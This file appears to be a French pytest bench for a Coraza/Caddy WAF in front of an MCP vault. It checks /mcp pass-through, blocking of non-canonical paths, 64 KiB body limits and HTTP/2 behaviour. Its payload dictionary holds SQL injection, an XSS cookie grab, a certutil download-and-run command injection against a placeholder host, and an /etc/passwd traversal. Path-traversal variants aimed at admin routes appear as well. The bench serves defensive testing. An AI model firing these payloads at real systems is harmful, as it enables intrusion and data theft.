"""Banc du WAF RÉEL (#118, #112, #114) — lancé par `waf/tests/run_bench.sh`.

Ce banc n'est PAS collecté par la suite applicative (il vit hors de `tests/`)
et il ÉCHOUE, sans jamais sauter, si la pile qu'il exige n'est pas démarrée :
en CI, un vert ne doit jamais venir d'un test qui n'a rien exercé.

Pile exercée (voir run_bench.sh) :
- WAF « factice » : l'image waf/ devant un backend qui journalise ce qu'il
  reçoit. Permet d'affirmer qu'une requête a été — ou n'a PAS été — transmise ;
- WAF « application » : la même image devant l'image de production mcp-vault
  (mode dégradé). Permet d'identifier QUELLE couche ASGI a répondu ;
- WAF « TLS » : la même image en `tls internal`, pour HTTP/2.

Discipline anti-complaisance : chaque charge utile envoyée sur /mcp pour
prouver qu'elle N'EST PAS inspectée est aussi envoyée sur une surface
inspectée, où elle DOIT être bloquée. Sans ce témoin, « /mcp laisse passer »
pourrait n'être que « la charge ne déclenche rien ».
"""

import http.client
import json
import os
import subprocess
from urllib.parse import urlsplit

import pytest

_VARS = ("MCP_VAULT_WAF_URL", "MCP_VAULT_WAF_STUB_URL", "MCP_VAULT_WAF_APP_URL",
         "MCP_VAULT_WAF_TLS_URL", "MCP_VAULT_WAF_ADAPTED", "MCP_VAULT_WAF_APP_TOKEN",
         "MCP_VAULT_WAF_APP_CONTAINER")
_MANQUANTES = [v for v in _VARS if not os.environ.get(v)]
if _MANQUANTES:
    pytest.fail(f"banc WAF non démarré (variables absentes : {_MANQUANTES}) — "
                "lancer waf/tests/run_bench.sh", pytrace=False)

WAF = urlsplit(os.environ["MCP_VAULT_WAF_URL"])
STUB = urlsplit(os.environ["MCP_VAULT_WAF_STUB_URL"])
APP = urlsplit(os.environ["MCP_VAULT_WAF_APP_URL"])
TLS = os.environ["MCP_VAULT_WAF_TLS_URL"]
APP_JETON = os.environ["MCP_VAULT_WAF_APP_TOKEN"]
APP_CONTENEUR = os.environ["MCP_VAULT_WAF_APP_CONTAINER"]
LIMITE = 65536


# ── Transport brut ───────────────────────────────────────────────────────────


class PanneInfrastructure(RuntimeError):
    """Réponse 5xx : le banc ne peut rien conclure. Volontairement PAS une
    AssertionError, pour qu'une panne ne soit jamais lue comme la détection
    d'une propriété perdue (waf/tests/mutations.py)."""


class Reponse:
    def __init__(self, status, headers, body):
        self.status, self.headers, self.body = status, headers, body

    @property
    def bloque_waf(self):
        return self.status == 403 and self.headers.get("x-mcp-vault-block") == "waf"


def envoyer(methode, chemin, corps=None, entetes=None, chunked=False, base=WAF):
    """Émet la cible TELLE QUELLE (aucune normalisation côté client)."""
    c = http.client.HTTPConnection(base.hostname, base.port, timeout=30)
    c.putrequest(methode, chemin, skip_host=False, skip_accept_encoding=True)
    h = {"Content-Type": "application/json"}
    h.update(entetes or {})
    for k, v in h.items():
        c.putheader(k, v)
    data = corps.encode() if isinstance(corps, str) else corps
    if chunked:
        c.putheader("Transfer-Encoding", "chunked")
        c.endheaders()
        for i in range(0, len(data), 8192):
            morceau = data[i:i + 8192]
            c.send(b"%x\r\n" % len(morceau) + morceau + b"\r\n")
        c.send(b"0\r\n\r\n")
    else:
        if data is not None:
            c.putheader("Content-Length", str(len(data)))
        c.endheaders()
        if data:
            c.send(data)
    r = c.getresponse()
    corps_r = r.read() if methode != "HEAD" else b""
    if r.status >= 500:
        raise PanneInfrastructure(f"{methode} {chemin} -> {r.status} {corps_r[:120]!r}")
    return Reponse(r.status, {k.lower(): v for k, v in r.getheaders()}, corps_r)


def journal(vider=False):
    c = http.client.HTTPConnection(STUB.hostname, STUB.port, timeout=10)
    c.request("DELETE" if vider else "GET", "/__stub/log")
    return json.loads(c.getresponse().read())


def complet(methode, cible, octets=0):
    return {"method": methode, "target": cible, "body_len": octets, "etat": "complet"}


@pytest.fixture
def factice():
    """Vide le journal du backend factice avant le test ; rend une fonction
    qui lit ce qu'il a reçu depuis."""
    journal(vider=True)
    return journal


# ── Charges utiles : opaques et légitimes sur /mcp, déclencheurs ailleurs ──


def _appel(arguments, outil="secret_write"):
    return json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                       "params": {"name": outil, "arguments": arguments}})


# Un PEM dont une ligne de base64 commence par « bash/ » : c'est la forme du
# faux positif 932370 constaté par DBaaS le 21/11/2026 sur pki_sign_csr.
CSR = ("-----BEGIN CERTIFICATE REQUEST-----\n"
       "MIIBNTCB3AIBADBQMQswCQYDVQQGEwJGUjEWMBQGA1UEChMNQ2xvdWQgVGVtcGxl\n"
       "bash/Zm9vYmFyQmF6cXV4MTIzNDU2Nzg5MEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZX\n"
       "-----END CERTIFICATE REQUEST-----\n")

CHARGES = {
    "sqli": _appel({"vault_id": "v", "path": "p",
                    "data": {"password": "' OR 1=1 UNION SELECT password FROM users--"}}),
    "xss": _appel({"vault_id": "v", "path": "p",
                   "data": {"notes": "<script>alert(document.cookie)</script>"}}),
    "rce": _appel({"vault_id": "v", "path": "p",
                   "data": {"notes": "x; certutil -urlcache -f http://h/a a.exe"}}),
    "lfi": _appel({"vault_id": "v", "path": "p",
                   "data": {"notes": "../../../../etc/passwd"}}),
    "csr_932370": _appel({"csr": CSR}, outil="pki_sign_csr"),
}

CHEMINS_MCP = ["/mcp", "/mcp/", "/mcp/sub", "/mcp?x=1", "/mcp/sub?x=1"]


# ── 1. Le témoin : chaque charge est un vrai déclencheur là où le WAF inspecte ─
#      Exception : `csr_932370`. Le faux positif DBaaS est apparu sous le
#      parseur JSON de /mcp (le `\n` du PEM devenait un vrai saut de ligne) ;
#      ce parseur n'existe plus nulle part, donc aucune surface inspectée ne
#      peut servir de témoin. Son RED est établi sur la configuration de main
#      (rapport de PR), et le cas reste utile ci-dessous : un PEM de la forme
#      d'une CSR (synthétique, pas une CSR cryptographiquement valide) doit
#      atteindre le backend intact.

TEMOINS = sorted(set(CHARGES) - {"csr_932370"})


@pytest.mark.parametrize("nom", TEMOINS)
@pytest.mark.parametrize("chemin", ["/admin/api/tokens", "/mcpfoo", "/mcp-x", "/health"])
def test_chaque_charge_est_bloquee_sur_une_surface_inspectee(factice, chemin, nom):
    r = envoyer("POST", chemin, CHARGES[nom])
    assert r.bloque_waf, (chemin, nom, r.status, r.headers)
    assert factice() == [], "une requête bloquée a atteint le backend"


# ── 2. /mcp canonique : jamais inspecté, transmis à l'identique ─────────────


@pytest.mark.parametrize("nom", sorted(CHARGES))
@pytest.mark.parametrize("chemin", CHEMINS_MCP)
def test_mcp_canonique_n_est_pas_inspecte(factice, chemin, nom):
    corps = CHARGES[nom]
    r = envoyer("POST", chemin, corps)
    assert r.status == 200, (chemin, nom, r.status, r.body[:200])
    assert "x-mcp-vault-block" not in r.headers
    assert factice() == [complet("POST", chemin, len(corps.encode()))]


@pytest.mark.parametrize("methode", ["GET", "DELETE", "OPTIONS"])
@pytest.mark.parametrize("chemin", CHEMINS_MCP)
def test_mcp_methodes_autorisees_atteignent_le_backend(factice, chemin, methode):
    r = envoyer(methode, chemin)
    assert r.status == 200, (methode, chemin, r.status)
    assert factice() == [complet(methode, chemin)]


@pytest.mark.parametrize("methode", ["PUT", "PATCH", "HEAD", "TRACE", "CONNECTX"])
@pytest.mark.parametrize("chemin", CHEMINS_MCP)
def test_mcp_autres_methodes_405_sans_backend(factice, chemin, methode):
    r = envoyer(methode, chemin, "{}" if methode in ("PUT", "PATCH") else None)
    assert r.status == 405, (methode, chemin, r.status)
    assert factice() == []


# ── 3. Variantes non canoniques : inspectées, donc la charge est bloquée ────

VARIANTES = [
    "//mcp", "/MCP", "/Mcp", "/%6dcp", "/mcp%2F..%2Fadmin%2Fapi%2Fwhoami",
    "/mcp/%2e%2e/admin/api/whoami", "/mcp/../admin/api/whoami", "/admin/../mcp",
    "/mcp/./x", "/mcp/.hidden", "/mcp//x", "/mcp;x", "/mcp%3Bx", "/mcp\\x",
    "http://localhost/mcp", "/mcp%00",
]


@pytest.mark.parametrize("chemin", VARIANTES)
def test_variante_non_canonique_passe_par_coraza(factice, chemin):
    r = envoyer("POST", chemin, CHARGES["sqli"])
    assert r.status in (400, 403), (chemin, r.status)
    assert factice() == [], f"{chemin} a atteint le backend sans inspection"


# ── 4. Borne de 65 536 octets, aux frontières exactes ───────────────────────


def test_borne_content_length_atteinte_exactement(factice):
    r = envoyer("POST", "/mcp", b"x" * LIMITE)
    assert r.status == 200
    assert factice() == [complet("POST", "/mcp", LIMITE)]


def test_borne_content_length_depassee_sans_aucun_contact(factice):
    r = envoyer("POST", "/mcp", b"x" * (LIMITE + 1))
    assert r.status == 413
    assert factice() == [], "le backend a été contacté malgré le Content-Length"


def test_content_length_enorme_ou_zero_prefixe(factice):
    # Corps réellement envoyé en entier quand il fait moins de 256 Kio : le
    # serveur Go de Caddy lit (et jette) un tel corps avant de répondre. Au-delà,
    # il répond sans le lire et ferme la connexion — d'où 2 octets suffisent.
    for valeur, corps in (("1000000000000", b"{}"), ("0000065537", b"x" * (LIMITE + 1))):
        c = http.client.HTTPConnection(WAF.hostname, WAF.port, timeout=10)
        c.putrequest("POST", "/mcp")
        c.putheader("Content-Type", "application/json")
        c.putheader("Content-Length", valeur)
        c.endheaders()
        c.send(corps)
        assert c.getresponse().status == 413, valeur
    assert factice() == []


def test_borne_chunked_atteinte_exactement(factice):
    r = envoyer("POST", "/mcp", b"x" * LIMITE, chunked=True)
    assert r.status == 200
    assert factice() == [complet("POST", "/mcp", LIMITE)]


def test_borne_chunked_depassee_jamais_plus_de_la_limite(factice):
    """Sans Content-Length, Caddy ne peut refuser qu'en lisant : le backend
    est contacté, mais il ne reçoit JAMAIS plus de 65 536 octets ni une
    requête complète. Contrat écrit tel quel, pas « aucun contact »."""
    r = envoyer("POST", "/mcp", b"x" * (LIMITE * 3), chunked=True)
    assert r.status == 413
    recu = factice()
    assert recu, "le cas n'exerce rien si le backend n'est jamais contacté"
    assert all(e["body_len"] <= LIMITE and e["etat"] != "complet" for e in recu), recu


@pytest.mark.parametrize("chemin", ["/mcp/./x", "//mcp", "///mcp/x", "/MCP", "/Mcp/x",
                                    "/%6dcp", "/%2Fmcp", "/x/../mcp", "/mcp;x",
                                    "http://localhost/mcp"])
def test_variante_inspectee_garde_la_borne_de_64_kio(factice, chemin):
    """Une variante non canonique traverse Coraza, qui doit lui appliquer la
    borne de 65 536 octets (règle 10008). Mesuré : Caddy transmet `//mcp` au
    backend sous la forme `/mcp` — sans cette borne, un corps de plusieurs Mo
    atteignait MCP par cette porte."""
    r = envoyer("POST", chemin, b"x" * (LIMITE + 1))
    assert r.status == 413, (chemin, r.status)
    assert factice() == []


def test_variante_sous_la_borne_reste_admise(factice):
    """Témoin : la borne ne refuse pas tout. Un petit corps bénin sur `//mcp`
    traverse Coraza et atteint le backend (normalisé en `/mcp`)."""
    r = envoyer("POST", "//mcp", b'{"jsonrpc": "2.0"}')
    assert r.status == 200, r.status
    assert [e["target"] for e in factice()] == ["/mcp"]


def test_preflight_hors_mcp_reste_inspecte(factice):
    assert envoyer("OPTIONS", "/health").status == 204
    assert envoyer("OPTIONS", "/health?q=<script>alert(1)</script>").bloque_waf
    assert factice() == []


# ── 5. Refus du backend relayés tels quels, sans marque WAF ────────────────


@pytest.mark.parametrize("statut", ["401", "403"])
@pytest.mark.parametrize("chemin", ["/mcp", "/admin/api/whoami"])
def test_refus_du_backend_relaye_sans_marque_waf(factice, chemin, statut):
    r = envoyer("GET", chemin, entetes={"X-Stub-Status": statut})
    assert r.status == int(statut)
    assert "x-mcp-vault-block" not in r.headers
    assert len(factice()) == 1


def test_en_tetes_de_securite_sur_mcp(factice):
    r = envoyer("POST", "/mcp", CHARGES["sqli"])
    assert r.headers.get("strict-transport-security", "").startswith("max-age=")
    assert r.headers.get("x-content-type-options") == "nosniff"
    assert r.headers.get("x-frame-options") == "DENY"
    assert "server" not in r.headers


# ── 6. Exclusions retirées : aucun nom `json.*` ne contourne plus le CRS ────
#      (les gardes 10009/10010 sont parties avec les exclusions qu'elles
#      protégeaient : le nom forgé doit être inspecté comme le témoin)


@pytest.mark.parametrize("forme", ["query", "form", "multipart"])
@pytest.mark.parametrize("nom", ["legit", "json.params.arguments.data.x", "json.params._meta.x"])
def test_nom_json_forge_inspecte_comme_le_temoin(factice, forme, nom):
    valeur = ".env"
    if forme == "query":
        r = envoyer("GET", f"/health?{nom}={valeur}")
    elif forme == "form":
        r = envoyer("POST", "/admin/api/tokens", f"{nom}={valeur}",
                    {"Content-Type": "application/x-www-form-urlencoded"})
    else:
        borne = "XbancWAF"
        corps = (f"--{borne}\r\nContent-Disposition: form-data; name=\"{nom}\"\r\n\r\n"
                 f"{valeur}\r\n--{borne}--\r\n")
        r = envoyer("POST", "/admin/api/tokens", corps,
                    {"Content-Type": f"multipart/form-data; boundary={borne}"})
    assert r.bloque_waf, (forme, nom, r.status)
    assert factice() == []


def test_nom_json_forge_portant_env_dans_le_nom(factice):
    r = envoyer("GET", "/health?json.params._meta.environment.cwd=x")
    t = envoyer("GET", "/health?legit.environment.cwd=x")
    assert r.bloque_waf == t.bloque_waf, "le nom json.* est traité autrement que le témoin"


# ── 7. #114 : aucune exclusion ne fuit vers une variante de chemin ──────────


def test_exclusion_920540_admin_ne_fuit_pas_au_double_slash(factice):
    corps = '{"description": "caf\\u00e9"}'
    assert not envoyer("POST", "/admin/api/tokens", corps).bloque_waf
    journal(vider=True)
    assert envoyer("POST", "//admin/api/tokens", corps).bloque_waf
    assert factice() == []


def test_exclusion_10005_pki_ne_fuit_pas_au_double_slash(factice):
    assert envoyer("GET", "/pki/ca/root.pem").status == 200
    journal(vider=True)
    assert envoyer("GET", "//pki/ca/root.pem").bloque_waf
    assert factice() == []


# ── 8. Structure : rate limit avant tout aiguillage, Coraza hors branche MCP ─


def _handlers(noeud):
    if isinstance(noeud, dict):
        if "handler" in noeud:
            yield noeud
        for v in noeud.values():
            yield from _handlers(v)
    elif isinstance(noeud, list):
        for v in noeud:
            yield from _handlers(v)


def test_structure_de_la_configuration_chargee():
    conf = json.load(open(os.environ["MCP_VAULT_WAF_ADAPTED"]))
    (serveur,) = conf["apps"]["http"]["servers"].values()
    routes = serveur["routes"]
    premiers = [h["handler"] for h in routes[0]["handle"]]
    assert premiers[0] == "rate_limit", premiers
    branches_mcp = [r for r in routes if "orig_uri" in json.dumps(r.get("match", []))]
    assert len(branches_mcp) == 1, "aiguillage /mcp introuvable ou dupliqué"
    assert routes.index(branches_mcp[0]) > 0
    assert "waf" not in {h["handler"] for h in _handlers(branches_mcp[0])}
    autres = [r for r in routes if r is not branches_mcp[0]]
    assert "waf" in {h["handler"] for h in _handlers(autres)}, "Coraza absent ailleurs"


# ── 9. HTTP/2 (TLS) : même contrat ──────────────────────────────────────────


def _curl_h2(methode, chemin, corps=None):
    cmd = ["curl", "-sk", "--http2", "--path-as-is", "-o", "/dev/null",
           "-w", "%{http_version} %{http_code}", "-X", methode,
           "-H", "Content-Type: application/json"]
    if corps is not None:
        cmd += ["--data-binary", corps]
    sortie = subprocess.run(cmd + [TLS + chemin], capture_output=True, text=True,
                            check=True, timeout=30).stdout.split()
    if int(sortie[1]) >= 500:
        raise PanneInfrastructure(f"HTTP/2 {methode} {chemin} -> {sortie[1]}")
    return sortie


def test_http2_meme_contrat(factice):
    assert _curl_h2("POST", "/mcp", CHARGES["sqli"]) == ["2", "200"]
    assert [e["target"] for e in factice()] == ["/mcp"]
    journal(vider=True)
    assert _curl_h2("POST", "//mcp", CHARGES["sqli"]) == ["2", "403"]
    assert _curl_h2("POST", "/admin/api/tokens", CHARGES["sqli"]) == ["2", "403"]
    assert _curl_h2("PUT", "/mcp", "{}") == ["2", "405"]
    assert factice() == []


def test_http2_flux_sans_longueur_borne(factice):
    """HTTP/2 n'a pas de chunked : un corps envoyé sans Content-Length est un
    flux. Le backend ne doit pas en recevoir plus de 65 536 octets."""
    fini = subprocess.run(
        ["curl", "-sk", "--http2", "-o", "/dev/null", "-w", "%{http_version} %{http_code}",
         "-H", "Content-Type: application/json", "-T", "-", "-X", "POST", TLS + "/mcp"],
        input=b"x" * (LIMITE * 3), capture_output=True, check=True, timeout=30)
    version, statut = fini.stdout.decode().split()
    if int(statut) >= 500:
        raise PanneInfrastructure(f"HTTP/2 flux -> {statut}")
    assert (version, statut) == ("2", "413")
    recu = factice()
    assert all(e["body_len"] <= LIMITE and e["etat"] != "complet" for e in recu), recu


# ── 10. Pile réelle : quelle couche ASGI répond ? ───────────────────────────
#       Sans jeton, la couche d'authentification MCP répond `invalid_token` et
#       la couche admin `Valid token required`. Une cible qui contourne Coraza
#       ne doit jamais être servie par une autre couche que celle de /mcp.

MCP_401 = b'"invalid_token"'
ADMIN_401 = b'"Valid token required"'


def test_empreintes_des_couches_sur_l_application_reelle():
    assert MCP_401 in envoyer("POST", "/mcp", "{}", base=APP).body
    assert ADMIN_401 in envoyer("GET", "/admin/api/whoami", base=APP).body


@pytest.mark.parametrize("methode", ["GET", "POST", "DELETE", "OPTIONS"])
@pytest.mark.parametrize("chemin", CHEMINS_MCP)
def test_contournement_servi_par_la_couche_mcp(chemin, methode):
    r = envoyer(methode, chemin, "{}" if methode == "POST" else None, base=APP)
    assert r.status == 401 and MCP_401 in r.body, (methode, chemin, r.status, r.body[:120])


@pytest.mark.parametrize("entete", ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"])
def test_en_tetes_de_reecriture_sans_effet(entete):
    for cible in ("/admin/api/whoami", "/health", "/pki/ca/root.pem"):
        r = envoyer("POST", "/mcp", "{}", {entete: cible}, base=APP)
        assert r.status == 401 and MCP_401 in r.body, (entete, cible, r.status)


@pytest.mark.parametrize("chemin", ["/mcp%2F..%2Fadmin%2Fapi%2Fwhoami",
                                    "/mcp/%2e%2e/admin/api/whoami",
                                    "/mcp/../admin/api/whoami"])
def test_traversee_depuis_mcp_jamais_servie_par_l_admin_sans_inspection(chemin):
    r = envoyer("POST", chemin, CHARGES["sqli"], base=APP)
    assert r.bloque_waf, (chemin, r.status, r.body[:120])


def test_application_reelle_borne_de_taille():
    r = envoyer("POST", "/mcp", b"x" * (LIMITE + 1), base=APP)
    assert r.status == 413


ACCES_200 = "POST /mcp → 200"


def _journal_app():
    """Journal de l'application. Une lecture qui échoue fait ÉCHOUER le test :
    un journal vide rendrait toute comparaison « avant / après » vraie."""
    fini = subprocess.run(["docker", "logs", APP_CONTENEUR], capture_output=True,
                          text=True, timeout=30)
    assert fini.returncode == 0, f"docker logs a échoué : {fini.stderr[-500:]}"
    return fini.stdout + fini.stderr


def test_application_reelle_flux_trop_long_jamais_traite():
    """Appel MCP AUTHENTIFIÉ et valide, dont `data` pousse le corps au-delà de
    65 536 octets, transmis en flux (sans Content-Length). Il n'est jamais
    traité avec succès : refus 400/413 (jamais 2xx ni 5xx), et aucune ligne
    d'accès 200 pour /mcp dans le journal de l'application, alors que les
    deux témoins `tools/list` qui l'encadrent y apparaissent bien — sans quoi
    l'absence de ligne ne prouverait rien. La frontière d'appel de l'outil
    elle-même est observée par tests/test_mcp_body_bounds_118.py."""
    entetes = {"Authorization": f"Bearer {APP_JETON}",
               "Accept": "application/json, text/event-stream"}
    liste = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    depart = _journal_app().count(ACCES_200)
    assert envoyer("POST", "/mcp", liste, entetes, base=APP).status == 200, "témoin : jeton refusé"
    avant = _journal_app().count(ACCES_200)
    assert avant == depart + 1, "le témoin n'est pas observable dans le journal"
    gros = json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {
        "name": "secret_write", "arguments": {"vault_id": "banc-118", "path": "p",
                                              "data": {"notes": "x" * (LIMITE * 2)}}}})
    r = envoyer("POST", "/mcp", gros, entetes, chunked=True, base=APP)
    assert r.status in (400, 413), (r.status, r.body[:200])
    assert _journal_app().count(ACCES_200) == avant, "appel tronqué traité avec succès"
    assert envoyer("POST", "/mcp", liste, entetes, base=APP).status == 200, "témoin final"
    assert _journal_app().count(ACCES_200) == avant + 1, "témoin final non observé"


def test_application_reelle_flux_trop_long_sans_jeton():
    """Réponse anticipée : sans jeton, l'application refuse AVANT de lire le
    corps. Le client peut donc recevoir 401 au lieu de 413 ; jamais un 2xx."""
    r = envoyer("POST", "/mcp", b"x" * (LIMITE * 3), chunked=True, base=APP)
    assert r.status in (401, 413), r.status
